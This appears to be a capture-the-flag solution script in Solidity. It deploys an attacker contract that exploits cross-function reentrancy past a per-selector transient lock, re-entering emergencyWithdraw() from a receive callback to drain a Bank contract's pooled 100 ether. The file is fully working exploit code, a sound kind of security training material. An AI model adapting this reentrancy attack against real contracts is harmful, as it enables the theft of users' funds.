// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C4Latch.sol";

/// Cross-function reentrancy past the per-selector transient lock: deposit, call
/// withdraw(), and from the ETH callback re-enter emergencyWithdraw() — a
/// different selector, hence a different lock — to get paid the balance twice.
contract LatchAttacker {
    Bank public bank;
    bool private re;

    constructor(Bank b) { bank = b; }

    function pwn() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (!re) {
            re = true;
            bank.emergencyWithdraw();   // different selector -> lock not held
        }
    }
}

contract SolveC4 is Script {
    function run() external {
        Bank bank = LatchSetup(vm.envAddress("SETUP")).bank();
        vm.startBroadcast();
        LatchAttacker a = new LatchAttacker(bank);
        a.pwn{value: 100 ether}();     // matches the pooled balance -> full drain
        vm.stopBroadcast();
    }
}
